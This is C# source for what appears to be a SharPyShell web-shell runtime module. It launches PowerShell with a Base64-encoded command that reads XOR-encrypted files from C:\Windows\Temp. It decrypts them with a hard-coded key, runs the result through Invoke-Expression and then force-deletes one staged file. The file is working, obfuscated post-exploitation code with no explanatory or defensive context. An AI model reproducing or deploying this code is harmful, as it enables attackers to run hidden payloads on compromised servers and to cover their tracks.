
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    public class SharPyShell
                    {                    
                        string ExecPs(string encoded_command, string working_path)
                        {
                            ProcessStartInfo pinfo = new ProcessStartInfo();
                            pinfo.FileName = Environment.GetEnvironmentVariable("SYSTEMROOT") +  @"\System32\WindowsPowerShell\v1.0\powershell.exe";
                            pinfo.Arguments = " -nop -noni -enc " + encoded_command;
                            pinfo.RedirectStandardOutput = true;
                            pinfo.RedirectStandardError = true;
                            pinfo.UseShellExecute = false;
                            pinfo.WorkingDirectory = working_path;
                            Process p = new Process();
                            try{
                                p = Process.Start(pinfo);
                            }
                            catch (Exception e){
                                return "{{{SharPyShellError}}}\n" + e;
                            }
                            StreamReader stmrdr_output = p.StandardOutput;
                            StreamReader stmrdr_errors = p.StandardError;
                            string output = "";
                            string stand_out = stmrdr_output.ReadToEnd();
                            string stand_errors = stmrdr_errors.ReadToEnd();
                            stmrdr_output.Close();
                            stmrdr_errors.Close();
                            if (!String.IsNullOrEmpty(stand_out))
                                output = output + stand_out;
                            if (!String.IsNullOrEmpty(stand_errors))
                                output = output + "{{{SharPyShellError}}}\n " + stand_errors;
                            return output;
                        }

                        public byte[] ExecRuntime()
                        {
                            string output_func=ExecPs(@"JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHgAMQBmAHYAbwBnAGkAagBwADUAcAB5AHoAbgA3AFwAdABiAHkAagB6AHQANAB2AHcANgB5ACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAeAAxAGYAdgBvAGcAaQBqAHAANQBwAHkAegBuADcAXAAzADEAOAA2AHEAMQByADMAawBwAHYAawAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADQAZAA2ADUAYgBkAGIAYQBkADEAOAAzAGYAMAAwADIAMAAzAGIAMQBlADgAMABjAGYAOQA2AGYAYgBhADUANAA5ADYANgAzAGQAYQBiAGUAYQBiADEAMgBmAGEAYgAxADUAMwBhADkAMgAxAGIAMwA0ADYAOQA3ADUAYwBkAGQAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==", @"C:\Windows\Temp\infinity_edge");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }
                    